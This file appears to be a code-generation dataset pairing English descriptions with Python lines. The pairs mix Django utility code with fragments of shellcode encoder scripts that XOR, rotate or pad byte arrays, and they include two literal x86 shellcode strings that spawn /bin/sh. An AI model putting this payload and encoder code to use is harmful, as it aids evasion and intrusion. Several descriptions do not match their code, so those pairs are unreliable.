@@ -1,0 +1,2040 @@
+convert to hexadecimal a random integer between 1 and 100 and append it to the string a </s> a += '\\x%02x' % random . randint ( 1 , 100 )
+append string '0x' to a </s> a += '0x'
+increment a by 1 </s> a += 1
+cast a to int16 </s> a = int ( hopcode , 16 )
+ba1 is a bytearrary of ba1 </s> ba1 = bytearray ( ba1 )
+call the import_string with argument backend, substitute it for backend_cls. </s> backend_cls = import_string ( backend )
+bad_app_labels is an empty set. </s> bad_app_labels = set ( )
+break loop execution. </s> break
+break from the loop execution. </s> break
+breaks from the smallest enclosing loop. </s> break
+skip this loop iteration. </s> break
+break from the loop execution </s> break
+read one line from self file stream, substitute the result for buf. </s> buf = self . readline ( )
+buf is an instance of StreamingBuffer class. </s> buf = StreamingBuffer ( )
+substitute line for buffer_. </s> buffer_ = line
+builtins is an dictionary with 3 initial entries: boolean True for 'True', boolean False for 'False' and None for 'None'. </s> builtins = { 'True' : True , 'False' : False , 'None' : None }
+call te method operator.itemgetter with an argument integer 0, substitute the result for byte2int. </s> byte2int = operator . itemgetter ( 0 )
+convert bytes to floating point number, substitute it for bytes. </s> bytes = float ( bytes )
+c is the sum of a and b modulo 100 </s> c = ( a + b ) % 100
+call the self._read_limiter with length of self.buffer subtracted from size as argument, store the result into chunk. </s> chunk = self . _read_limited ( size - len ( self . buffer ) )
+call the method stream.read with an argument max_header_size, substitute the result for chunk. </s> chunk = stream . read ( max_header_size )
+substitute length of chunk for chunk_length. </s> chunk_length = len ( chunk )
+double the chunk size. </s> chunk_size *= 2
+call the function get_quantifier with 2 arguments: ch and pattern_iter, substitute the result for count and ch, respectively. </s> count , ch = get_quantifier ( ch , pattern_iter )
+call the itertools.count function with argument integer 1, substitute the result for count. </s> count = itertools . count ( 1 )
+multiply seconds by count, subtract it from since, divide the result by seconds2, store the floored result in count2. </s> count2 = ( since - ( seconds * count ) ) // seconds2
+define a variable named counter and assign 0 to it </s> counter = 0
+add the string value '0x' to the variable d </s> d += '0x'
+append e to debugs list for every e in all_issues, if e.level is lesser than checks.INFO and result of the method e.is_silenced in false. </s> debugs = [ e for e in all_issues if e . level < checks . INFO and not e . is_silenced ( ) ]
+substitute first decimal_pos elements of dec_part for dec_part. </s> dec_part = dec_part [ : decimal_pos ]
+update declared_fields dictionary with entry base.declared_fields. </s> declared_fields . update ( base . declared_fields )
+declared_fields is an instance of OrderedDict class. </s> declared_fields = OrderedDict ( )
+call the function curry with 2 arguments: _proxy_method and method set to bytes.decode, substitute the result for decode. </s> decode = curry ( _proxy_method , method = bytes . decode )
+s and max_age set to max_age, use it as an argument for the force_bytes function, substitute the result for base64d.   decompress is boolean False. </s> decompress = False
+called with with an argument lambda function which returns result of the force_text function called with an argument text.   define the method add_truncation_text with 3 arguments: self, text and truncate set to None. </s> def add_truncation_text ( self , text , truncate = None ) : 
+define a method named add with the parameters a, b and c. C has a default value of 3 </s> def add ( a , b , c = 3 ) : 
+define the function find_template_loader with an argument loader. </s> def find_template_loader ( loader ) : 
+define the function first with an argument value. </s> def first ( value ) : 
+define a method named func with the parameters n,x, and y. Y has a default value of 1 </s> def func ( n , x , y = 1 ) : 
+define the function mark_safe with an argument s. </s> def mark_safe ( s ) : 
+define the function media with an argument request. </s> def media ( request ) : 
+define the function rmtree_errorhandler with 3 arguments func, path and exc_info. </s> def rmtree_errorhandler ( func , path , exc_info ) : 
+define the method root_attributes with an argument self. </s> def root_attributes ( self ) : 
+define a method named routine that takes in n as a parameter </s> def routine ( n ) : 
+define the method rss_attributes with an argument self. </s> def rss_attributes ( self ) : 
+else if name is equal to the string 'abcd' </s> elif name == 'abcd':
+otherwise if fourth element of version does not equals to 'final', </s> elif version [ 3 ] != 'final' :
+if not, </s> else :
+to the function timedelta called with an argument seconds as negative time.altzone, return the result.   if not, </s> else :
+elt is an list with an element elt. </s> elt = [ elt ]
+EMPTY_VALUES is a tuple containing 5 initial elements: None, empty string, empty list, empty tuple and an empty dictionary. </s> EMPTY_VALUES = ( None , '' , [ ] , ( ) , { } )
+put elements of validators.EMPTY_VALUES to a list, substitute the result for empty_values. </s> empty_values = list ( validators . EMPTY_VALUES )
+call the function curry with 2 arguments: _proxy_method and method set to six.text_type.encode, substitute the result for encode. </s> encode = curry ( _proxy_method , method = six . text_type . encode )
+encode is an lambda function with arguments k and v, return value is string '%s=%s', where '%s' is replaced with: </s> encode = lambda k , v : '%s=%s' % ( ( quote ( k , safe ) , quote ( v , safe ) ) )
+add the string value ',' to the variable encoded </s> encoded += ', '
+add the string value '\\y' to the variable encoded </s> encoded += '\\y'
+Convert the value of j to a hexadecimal then add it to the variable encoded followed by the string ', ' </s> encoded += '%02x, ' % j
+Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded followed by the string ',' </s> encoded += '%02x, ' % ( y & 0xff )
+Convert the value of x to a hexadecimal then add it to the variable encoded followed by the string ', ' </s> encoded += '%02x, ' % x
+Convert the variable x to a hexadecimal. Concatenate the result with the string ',' add the result to the variable encoded </s> encoded += '%02x, ' % x
+convert the value x to hex, concatenate the result with ',' and append it to the string encoded </s> encoded += '%02x, ' % x
+convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded </s> encoded += '%02x, ' % ( 7 - ( 256 - x ) )
+Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded </s> encoded += '%02x, ' % ( h & 0xff )
+convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded </s> encoded += '%02x, ' % ( x + 7 )
+Convert the value of y to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded </s> encoded += '%02x, ' % y
+convert the value x to hex and append it to the string encoded </s> encoded += '%02x' % x
+concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded </s> encoded += '0x%02x, ' % 0xAA
+concatenate the string '0x' with the hexadecimal conversion of rand and append the result to the string encoded </s> encoded += '0x%02x, ' % rand
+set encoded to the string '0x' </s> encoded = '0x'
+encoded is the concatenation of the string "0x" with the hexadecimal conversion of the lenght of the array of bytes of shellcode </s> encoded = '0x%02x, ' % len ( bytearray ( shellcode ) )
+convert the value z to hex and append it to the string encoded1 </s> encoded1 += '%02x' % z
+Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded3 </s> encoded3 += hex ( leader ) [ 2 : ]
+call the method Encoders.encode_base64 with an argument attachment. </s> Encoders . encode_base64 ( attachment )
+substitute string 'ascii' for encoding. </s> encoding = 'ascii'
+if encoding does not exists substitute it for settings.DEFAULT_CHARSET. </s> encoding = encoding or settings . DEFAULT_CHARSET
+substitute elements of tuple boundary to end and next, respectively. </s> end , next = boundary
+es is a bytearrary of the byte string "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80" </s> es = bytearray ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' )
+if ZeroDivisionError exception is caught, </s> except ZeroDivisionError :
+if zlib.error as e exception is raised, </s> except zlib . error as e :
+except </s> except:
+executor is an instance of the class MigrationExecutor created with an argument: value under the DEFAULT_DB_ALIAS key of the connections dictionary. </s> executor = MigrationExecutor ( connections [ DEFAULT_DB_ALIAS ] )
+substitute them for app_label and migration_name, respectively.   executor is an instance of MigrationExecutor, created with value under the DEFAULT_DB_ALIAS key of the connections dictionary. </s> executor = MigrationExecutor ( connections [ DEFAULT_DB_ALIAS ] )
+call the function exhaust with an argument field_stream. </s> exhaust ( field_stream )
+call the function exhaust with an argument self._input_data. </s> exhaust ( self . _input_data )
+call the function os.spawnve with os.P_WAIT, sys.executable, args and new_environ as arguments, substitute the result for exit_code. </s> exit_code = os . spawnve ( os . P_WAIT , sys . executable , args , new_environ )
+call the function restart_with_reloader, substitute the return value for exit_code. </s> exit_code = restart_with_reloader ( )
+terminate the program with exit code 4 </s> exit ( 4 )
+terminate the program with exit code 5 </s> exit ( 5 )
+on the object under the db key of connections dictionary call the method ops.value_to_db_datetime with argument exp, substitute the result for the exp. </s> exp = connections [ db ] . ops . value_to_db_datetime ( exp )
+call the function datetime.fromtimestamp with argument timeout, substitute it for exp. </s> exp = datetime . fromtimestamp ( timeout )
+call the method test_runner.run_tests with an argument test_labels, substitute it for failures. </s> failures = test_runner . run_tests ( test_labels )
+FASTCGI_OPTIONS is a dictionary containing 16 initial entries: 'fcgi' for 'protocol', None for 'host', None for 'port', </s> FASTCGI_OPTIONS = { 'protocol' : 'fcgi' , 'host' : None , 'port' : None , 'socket' : None , 'method' : 'fork' , 'daemonize' : None , 'workdir' : '/' , 'pidfile' : None , 'maxspare' : 5 , 'minspare' : 2 , 'maxchildren' : 50 , 'maxrequests' : 0 , 'debug' : None , 'outlog' : None , 'errlog' : None , 'umask' : None , }
+dir set to None as the arguments.   call the method tmpfile.mkstemp with suffix set to suffix, prefix set to prefix and dir set to dir, store the result in the fd and name, respective. </s> fd , name = tempfile . mkstemp ( suffix = suffix , prefix = prefix , dir = dir )
+join base an unpacked list paths into a string, get the absolute path in unicode representation of the result, substitute the result for final_path. </s> final_path = abspathu ( join ( base , * paths ) )
+finally perform, </s> finally :
+call the method smart_split_re.finditer with an argument text, for every bit in result, </s> for bit in smart_split_re . finditer ( text ) : 
+split tag_re by self.template_string separator, for every bit in result, </s> for bit in tag_re . split ( self . template_string ) : 
+iterate over bytes in array </s> for byte in array : 
+iterate bytes in list lst </s> for byte in lst : 
+iterate byte in the list lst1 </s> for byte in lst1 : 
+iterate byte in lst2 </s> for byte in lst2 : 
+iterate over bytes in lst3 </s> for byte in lst3_
+for every bytes in stream, </s> for bytes in stream : 
+for every c in lineno_comment_map dictionary value under the comment_lineno_cache key, </s> for c in lineno_comment_map [ comment_lineno_cache ] : 
+for every ch and escaped in input_iter, </s> for ch , escaped in input_iter : 
+for every ch in input_iter, </s> for ch in input_iter : 
+for every char in fmt, </s> for char in fmt : 
+iterate char over str </s> for char in str : 
+for every i and widget in enumerated iterable self.widgets, </s> for i , widget in enumerate ( self . widgets ) : 
+for every i and word in enumerated iterable words, </s> for i , word in enumerate ( words ) : 
+loop through sc3 converted into a bytearray </s> for i in bytearray ( sc3 ) : 
+Make a for loop for each i in the bytearray of sc4 </s> for i in bytearray ( sc4 ) : 
+declare a for loop with an iterator i for each element in sh starting from index 4 converted into a bytearray </s> for i in bytearray ( sh ) [ 4 : ] : 
+iterate i in lst </s> for i in lst : 
+iterate i over 200 random numbers between 1 and 256 </s> for i in random . sample ( range ( 1 , 256 ) , 200 ) : 
+for every i in range of integers from integer 0 to the length of pieces decremented by one, with step of integer 3, </s> for i in range ( 0 , len ( pieces ) - 1 , 3 ) : 
+call the method self.total_form_count, for every i in sequence of integers, from 0 to the previous result, </s> for i in range ( 0 , self . total_form_count ( ) ) : 
+for every i in range of integers from 0 to length of result, not included, </s> for i in range ( len ( result ) ) : 
+iterate i over a sequence of number from 0 to 5 </s> for i in range ( 0 , 5 ) : 
+initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 8 </s> for i in range ( 0 , len ( shellcode_original ) , 8 ) : 
+initialize a for loop with an iterator i with a range starting from 0 until the value of stop </s> for i in range ( 0 , stop ) : 
+loop over shellcode </s> for i in shellcode : 
+zip elements of inner_result and inner_args into a list of tuples, for every i_item and i_args in the result, </s> for i_item , i_args in zip ( inner_result , inner_args ) : 
+for every index in range of integers from 0 to length of hextets, not included, </s> for index in range ( len ( hextets ) ) : 
+for every j in range of integers from 0 to iterations converted to an integer, </s> for j in xrange ( int ( iterations ) ) : 
+for every x in argset, </s> for x in argset : 
+Make a for loop for each x in the bytearray of sh1 </s> for x in bytearray ( sh1 ) : 
+loop through sh2 converted into a bytearray </s> for x in bytearray ( sh2 ) : 
+loop x over the bytearray of the string sh3 </s> for x in bytearray ( sh3 ) : 
+for every x is the range of integers from level to the integer 2, in the reversed order, </s> for x in range ( level , 1 , - 1 ) : 
+substitute force_bytes for force_str. </s> force_str = force_bytes
+get the value under the 'format' key of the options dictionary, substitute the result for format. </s> format = options . get ( 'format' )
+append encoded_instruction_in_hex and string "," to the variable format_0x </s> format_0x += encoded_instruction_in_hex + ', '
+initialize format_0x to an empty string </s> format_0x = ''
+format key is an empty string. </s> format_key = ''
+format_slash_x is an empty string "" </s> format_slash_x = ''
+substitute second element of bits without the first and last element for format_string. </s> format_string = bits [ 1 ] [ 1 : - 1 ]
+call the function re.sub with 3 arguments: raw string "\\.|.", escape_quotes and tok without the first and last element, </s> guts = re . sub ( r'\\.|.' , escape_quotes , tok [ 1 : - 1 ] )
+h is the sum of y and x modulo 256 </s> h = ( y + x ) % 256
+substitute self.handle_app for handle_app. </s> handle_app = self . handle_app
+call the function digest, substitute the filed digest_size of the result for hlen. </s> hlen = digest ( ) . digest_size
+if return value of the self.is_secure is false and server port is not equal to string '80',   join host and server_port into a string, separated with ':', substitute the result for host. </s> host = '%s:%s' % ( host , server_port )
+result of the function force_text called with an argument title, and with sublist, append the string to output.   increment i by 1. </s> i += 1
+increment i by 1 </s> i += 1
+add 1 to the variable i </s> i += 1
+i is integer 0. </s> i = 0
+substitute self.pointer for i. </s> i = self . pointer
+initialize i as an integer </s> i = 0
+I18N_MODIFIED is integer 2 </s> I18N_MODIFIED = 2
+if character '=' is contained in x, </s> if '=' in x : 
+if string "0x1," is in format_0x </s> if '0x1, ' in format_0x : 
+if string 'help' is contained in options, </s> if 'help' in options : 
+strings "Please submit %d or fewer forms.", "Please submit %d or fewer forms." and self.max_num,   where '%d' is replaced with self.max_num, and code as a string 'too_many_forms'.   if self.validate_min is true, and length of self.deleted_forms subtracted from the return value of the method self.total_form_count, </s> if ( self . validate_min and self . total_form_count ( ) - len ( self . deleted_forms ) < self . min_num ) : 
+check if the length of the variable a is not even </s> if ( len ( a ) % 2 ) != 0 : 
+check if the variable r xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0 </s> if ( r ^ shellcode_original [ i ] != 0 ) and ( r ^ shellcode_original [ i + 1 ] != 0 ) and ( r ^ shellcode_original [ i + 2 ] != 0 ) and ( r ^ shellcode_original [ i + 3 ] != 0 ) : 
+if response.status_code is lesser than integer 200 and grater or equal than 100, or response.status_code equals to integer 204 or 304, </s> if 100 <= response . status_code < 200 or response . status_code in ( 204 , 304 ) : 
+check if variable a is less than the value of 1 </s> if a < 1 : 
+if accept_lang equals '*', </s> if accept_lang == '*' : 
+if changes is true, </s> if changes : 
+if cookie is an empty string, </s> if cookie == '' : 
+if count does not equals to integer 0, </s> if count != 0 : 
+if count modulo 2 is not equal to zero </s> if count % 2 != 0 : 
+if count2 does not equals to integer 0, </s> if count2 != 0 : 
+if counter modulo 3 is equal to 0 </s> if counter % 3 == 0 : 
+if not csrf_token is None.   if csrf_token is true, </s> if csrf_token : 
+bring integer 36 to the power of factor, if i is smaller than the result, </s> if i < 36 ** factor : 
+if variable i is lower than the length of chunk </s> if i < len ( chunk ) : 
+if i equals to integer 0 and </s> if i == 0 and not is_writable ( npath ( base_path + '.mo' ) ) : 
+convert to integer base 16 the string shellcode encoded to hex and check if it is equal to i </s> if i == int ( shellcode . encode ( 'hex' ) , 16 ) : 
+if length of x is equal to integer 0, </s> if len ( x ) == 0 : 
+if len_values is smaller than integer 1, </s> if len_values < 1 : 
+if the length of sys.argv is not equal to 3 </s> if len ( sys . argv ) != 3 : 
+if the number of  command-line arguments is lower than 10 </s> if len ( sys . argv ) < 10 : 
+Check if the length of x is greater than 4 </s> if len ( x ) > 4 : 
+if the length of z is not divisable by 4 </s> if len ( z ) % 4 != 0 : 
+if level is true, </s> if level : 
+check if matched_a_byte is True </s> if matched_a_byte : 
+if mtime is different than the value of dictionary _mtimes under the key filename, </s> if mtime != _mtimes [ filename ] : 
+if match is false or call to the method match.group with an argument integer 1 evaluates to boolean false, </s> if not match or not match . group ( 1 ) : 
+check if matched_a_byte is not True </s> if not matched_a_byte : 
+if p_pattern starts with a string '^', </s> if p_pattern . startswith ( '^' ) : 
+check if the variable padding does not equal 0 </s> if padding : 
+if role is contained in value under the NOCOLOR_PALETTE key of the PALETTES dictionary and definition is true, </s> if role in PALETTES [ NOCOLOR_PALETTE ] and definition : 
+if root is true, </s> if root : 
+call the method router.allow_migrate with 2 arguments: self.using and obj.object.__class__, if it evaluates to true, </s> if router . allow_migrate ( self . using , obj . object . __class__ ) : 
+if fifth and sixth elements of row are None, </s> if row [ 4 ] is None or row [ 5 ] is None : 
+on the result call the method encode with the arguments encoding and errors, return the result.   if strings_only and boolean return value of the call to the function is_protected_type for argument s are boolean True, </s> if strings_only and is_protected_type ( s ) : 
+check if the bytes object containing my_value packed according to the format string unsigned char is equal to the variable z </s> if struct . pack ( 'B' , my_value ^ i ) == z : 
+if sub_match is true, </s> if sub_match : 
+if total is not equivalent to 2 </s> if total != 2 : 
+if with_base_fields is true, </s> if with_base_fields : 
+if words is not empty and length is smaller than or equal to integer 0, </s> if words and length <= 0 : 
+if x equals to integer 0, </s> if x == 0 : 
+check if x is equal to the element n in shellcode converted into a bytearray </s> if x == bytearray ( shellcode ) [ n ] : 
+check if xxx is greater or equals to 0 </s> if xxx >= 0 : 
+if y, m and d are all equal to string '0', </s> if y == m == d == '0' : 
+if z is equal to byte </s> if z == byte : 
+convert the string byte to hex, then cast the result to int16 and then check if it is equal to variable z </s> if z == int ( byte . encode ( 'hex' ) , 16 ) : 
+import module struc. </s> import struct
+import module subprocess. </s> import subprocess
+import module sys. </s> import sys
+import module tarfile. </s> import tarfile
+import module tempfile. </s> import tempfile
+inputs is an empty list. </s> inputs = [ ]
+substitute complain for insert. </s> insert = complain
+generate a random integer between 1 and 2 then convert the random number into a hexadecimal and store the value in insertByte </s> insertByte = hex ( random . randint ( 1 , 2 ) )
+and unpacked dictionary kwargs.   instance.keyOrder is an empty list. </s> instance . keyOrder = [ ]
+substitute _itervalues for itervalues. </s> itervalues = _itervalues
+compute the sum of i and magic modulus 256 and store in the variable j </s> j = ( i + magic ) % 256
+bring integer 36 to the power of factor, substitute the result for j. </s> j = 36 ** factor
+call the function escape with an argument lead, substitute the result for lead, call the function escape with an argument trail, </s> lead , trail = escape ( lead ) , escape ( trail )
+sum lead and opening, substitute the result for lead. </s> lead = lead + opening
+set leader to the second command-line argument after casting it to an int </s> leader = int ( sys . argv [ 2 ] )
+substitute length of values for len_values. </s> len_values = len ( values )
+print the length of array of bytes of the string var </s> len(bytearray(var)))
+substitute arg converted into a integer for length. </s> length = int ( arg )
+store in the variable length_format_0x the number of "," occurences in format_0x </s> length_format_0x = format_0x . count ( ', ' )
+increment level by one. </s> level += 1
+Declare an empty bytes literal and store it in the variable lit </s> lit = b''
+m2m_value is an lambda function with value as an argument, return value is the result of the method value.natural_key. </s> m2m_value = lambda value : value . natural_key ( )
+match is boolean True. </s> match = True
+matches is boolean False. </s> matches = False
+multiply delta.days with an integer 86400 add to the result delta.seconds, if the result is greater than integer 0, </s> max_age = max ( 0 , delta . days * 86400 + delta . seconds )
+intialize the variable max_bits to an integer with the value of 8 </s> max_bits = 8
+call the mw_class function, store the result in the mw_instance. </s> mw_instance = mw_class ( )
+n is equal to n bitwise and masked width </s> n &= mask ( width )
+Convert the value of y to a hexadecimal then add it to the variable n </s> n += '%02x' % y
+increase n by 1 </s> n += 1
+get the attribute '__name__' from the getattr, if it exists substitute it for m, if not, m is None. </s> n = getattr ( lookup_view , '__name__' , None )
+convert idx to an integer, substitute it or n. </s> n = int ( idx )
+initialize an empty string variable called name </s> name = ''
+in the variable encoded replace all occurrences of "\\x" with ",0x" </s> nasm = encoded . replace ( '\\x' , ',0x' )
+set the variable nasm to all the elements in the variable nasm starting from index 1 until the end </s> nasm = nasm [ 1 : ]
+call the value.natural_key method, substitute the result for natural. </s> natural = value . natural_key ( )
+call the method obj.natural_key, substitute the result for natural_key. </s> natural_key = obj . natural_key ( )
+set the variable nbits to the second command-line argument converted to integer </s> nbits = int ( sys . argv [ 2 ] )
+append orig_file to string '#: ', substitute it for new. </s> new = '#: ' + orig_file
+set the variable new to not i bitwise and 0xff </s> new = ~ i & 0xff
+set new to new xor the variable xor </s> new = new ^ xor
+set new to new shifted left by shift </s> new = new << shift
+ORDERING_FIELD_NAME is a string 'ORDER'. </s> ORDERING_FIELD_NAME = 'ORDER'
+set orig to an empty list </s> orig = [ ]
+call the method cls.__dict__.copy substitute the result for orig_vars. </s> orig_vars = cls . __dict__ . copy ( )
+append i to the variable orig </s> orig . append ( i )
+join tmpdir and sting 'original' into a file path name, substitute it for original_path. </s> original_path = os . path . join ( tmpdir , 'original' )
+convert the value x to a hexadecimal and append it to the string original_shellcode followed by the string ',' </s> original_shellcode += '%02x, ' % x
+close the process with an argument 0. </s> os . _exit ( 0 )
+exit the program with the code integer 1. </s> os . _exit ( 1 )
+feed data to the parser p. </s> p . feed ( data )
+P is a string '\03335m' </s> P = '\03335m'
+calculate negative length of s, by modulus integer 4, use the result as the number of '=' characters to be stored in pad. </s> pad = b'=' * ( - len ( s ) % 4 )
+assign the variable padding 4 minus the length of shellcode_original modulus 4 </s> padding = 4 - ( len ( shellcode_original ) % 4 )
+remove 3 elements from r starting at the index 23. </s> r = r [ : 23 ] + r [ 26 : ]
+set the variable r to a random integer between 10 and 255 </s> r = random . randint ( 10 , 255 )
+raise an exception. </s> raise
+RAISE_ERROR is an instance of object class. </s> RAISE_ERROR = object ( )
+random is an instance of random.SystemRandom class. </s> random = random . SystemRandom ( )
+assign the first two elements of op to res </s> res = op [ 0 : 2 ]
+increment res by element of to_digit at the digit index. </s> res = to_digits [ digit ] + res
+res is x xor y </s> res = x ^ y
+right shift by val2 the and operation between z and val1 and assign it to res1 </s> res1 = ( ( z & val1 ) >> val2 )
+perform the and operation between x shifted right by val2 and val1 and assign the result to res1 </s> res1 = ( x >> val2 ) & ( val1 )
+assign the variable res2 variable x bitwise and val1 </s> res2 = ( x & val1 )
+assign res2 the value of res2 left shift by max_bits minus val2 </s> res2 = res2 >> ( max_bits - val2 )
+left shift x by max_bits plus val2 and assign the result to res2 </s> res2 = x << ( max_bits + val2 )
+result is the concatenation of the string "\\x", the hexadecimal value of the length of array of bytes of the variable sc and the string ',' </s> result = '\\x%02x, ' % len ( bytearray ( sc ) )
+return a tuple with 3 elements: TYPE, outdict and stream. </s> return ( TYPE , outdict , stream )
+return the result of bitwise left shift of n and temp bitwise and mask_value bitwise or with the bitwise right shift of n by the subtraction of temp from width </s> return ( ( n << temp ) & mask_value ) | ( n >> ( width - temp ) )
+return the result of bitwise right shift of n and rotations xor the bitwise left shift of n and subtract rotations from width bitwise and mask_value </s> return ( n >> rotations ) ^ ( ( n << ( width - rotations ) ) & mask_value )
+return n right shift by rotations bitwise or with the result of n left shift by width bitwise and mask_value </s> return [ Warning ( 'BooleanField does not have a default value.' , hint = ( 'Django 1.6 changed the default value of BooleanField from False to None. ' 'See https://docs.djangoproject.com/en/1.6/ref/models/fields/#booleanfield ' 'for more information.' ) , obj = field , id = '1_6.W002' , ) for field in problem_fields ]
+return 2 to the power of n minus 1 </s> return 2 ** n - 1
+return i. </s> return i
+if filename ends with string '.mo' return I18N_MODIFIED, otherwise return FILE_MODIFIED. </s> return I18N_MODIFIED if filename . endswith ( '.mo' ) else FILE_MODIFIED
+return msgs. </s> return msgs
+return name. </s> return name
+call the method self.expression, substitute the result for retval. </s> retval = self . expression ( )
+substitute element at self.pos index of self.tokens for retval. </s> retval = self . tokens [ self . pos ]
+store in rev_suplx the reverse of the array suplX </s> rev_suplx = suplX [ : : - 1 ]
+substitute complain for reverse. </s> reverse = complain
+and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than other or self is equal to other,   tuple with 2 elements: string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is lesser than other or self is equal to other,   tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than other, for '__lt__',   list with 3 tuples: tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than or equal to other,   or self is equal to other, tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is lesser than or equal to other,   or self is not equal to other, tuple with 2 elements: string '__gt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is lesser than or equal to other, for '__le__',   list with 3 tuples: tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than other or self is equal to other,   tuple with 2 elements: string '__ge__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is greater than other or self is equal to other,   tuple with 2 elements: string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than other, for '__gt__',   and list with 3 tuples: tuple with 2 elements: string '__le__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is not greater than or is not equal to other,   or self is equal to other, tuple with 2 elements: string '__gt__',   and lambda function with 2 arguments: self and other, resulting boolean True if self is greater than or not equal to other,   or self is not equal to other, tuple with 2 elements: string '__lt__',   and lambda function with 2 arguments: self and other, resulting boolean False if self is greater than or equal to other, for '__ge__',   convert cls to a dictionary, convert the result into a set and convert convert into a set, roots is a set of differences of the two previous sets. </s> roots = set ( dir ( cls ) ) & set ( convert )
+ROT is the first command-line argument converted to integer </s> ROT = int ( sys . argv [ 1 ] )
+assign rox_encoded_instruction res1 bitwise or res2 </s> rox_encoded_instruction = res1 | res2
+append string '\\x' followed by the conversion in hex of 0xFF to the string s </s> s += '\\x%02x' % 0xAA
+set s to the string 'hello' </s> s = 'hello'
+assign sb the hexadecimal value of leader casted into an int16 </s> sb = int ( hex ( leader ) , 16 )
+append to sc a bytes object containing the value val2 packed according to the format string unsigned char </s> sc . append ( struct . pack ( 'B' , val2 ) )
+call the function urlsplit with an argument url, assign the result to scheme, netloc, path, query and fragment, respectively. </s> scheme , netloc , path , query , fragment = urlsplit ( url )
+call the method shell.mainloop. </s> shell . mainloop ( )
+convert shellcode to a bytearray and store its length in the variable shell_n </s> shell_len = len ( bytearray ( shellcode ) )
+concatenate in the string shellcode the concatenation of '\\x' and the string byte encoded in hexadecimal </s> shellcode += '\\x' + byte . encode ( 'hex' )
+Convert the value of x bitwise and 0xff to a hexadecimal then add it to the variable shellcode </s> shellcode += '%02x' % ( x & 0xff )
+remove the first 3 items from shellcode </s> shellcode = shellcode [ 3 : : ]
+Declare a string shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it </s> shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+assign the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x' </s> shellcode_encoded_hex = '' . join ( '\\x{:02x}' . format ( x ) for x in shellcode_encoded )
+store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ',' </s> shellcode_encoded_nasm = '' . join ( '0x{:02x}, ' . format ( i ) for i in shellcode_encoded ) . rstrip ( ', ' )
+append to the variable shellcode_encoded the value of shellcode_original at index i xor the variable r </s> shellcode_encoded . append ( shellcode_original [ i ] ^ r )
+append to the variable shellcode_encoded the value of shellcode_original at index i+1 xor the variable r </s> shellcode_encoded . append ( shellcode_original [ i + 1 ] ^ r )
+read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\t' with ''" and store the result in shellcode_original </s> shellcode_original = bytearray . fromhex ( f . read ( ) . strip ( ) . replace ( '\\t' , '' ) )
+assign the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x' </s> shellcode_original_hex = '' . join ( '\\x{:02x}' . format ( x ) for x in shellcode_original )
+append 0x70 to shellcode </s> shellcode . append ( 0x70 )
+shells is a list containing 2 elements: string 'ipython' and string 'bpython'. </s> shells = [ 'ipython' , 'bpython' ]
+if value is an instance of datetime and settings.USE_TZ if use_tz is None else use_tz and call to the function is_naive, </s> should_convert = ( isinstance ( value , datetime ) and ( settings . USE_TZ if use_tz is None else use_tz ) and not is_naive ( value ) and getattr ( value , 'convert_to_local_time' , True ) )
+append string '0x' to str </s> str += '0x'
+Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable str followed by ',' </s> str += '%02x, ' % ( z & 0xff )
+add the string value '0x' to the variable str </s> str += '0x'
+str is an empty string </s> str = ''
+initialize the variable str to an empty string </s> str = ''
+append str1 to str </s> str = str + str1
+add to str a bytes object containing the value xor_byte packed according to the format string unsigned char </s> str . append ( struct . pack ( 'B' , xor_byte ) )
+append string '0x' to str1 </s> str1 += '0x'
+add the string value '\\x' to the variable str1 </s> str1 += '\\x'
+str1 is a string containing the hexadecimal conversion of str </s> str1 = '%02x' % str
+str1 is a string "" </s> str1 = ''
+add to str1 a bytes object containing the value val4 packed according to the format string unsigned char </s> str1 . append ( struct . pack ( 'B' , val4 ) )
+convert shift to hexadecimal and append it followed by ', ' to the string str4 </s> str4 += '%02x, ' % shift
+convert val2 in hexadecimal and append it followed by ', ' to the string str5 </s> str5 += '%02x, ' % val2
+substitute str for string_types. </s> string_types = str ,
+call the function allow_lazy with an argument strip_tags, substitute the result for strip_tags. </s> strip_tags = allow_lazy ( strip_tags )
+substitute style.ERROR for style.ERROR_OUTPUT. </s> style . ERROR_OUTPUT = style . ERROR
+call the function get_commands, convert the result to a list, append string 'help' to it, substitute it for subcommands. </s> subcommands = list ( get_commands ( ) ) + [ 'help' ]
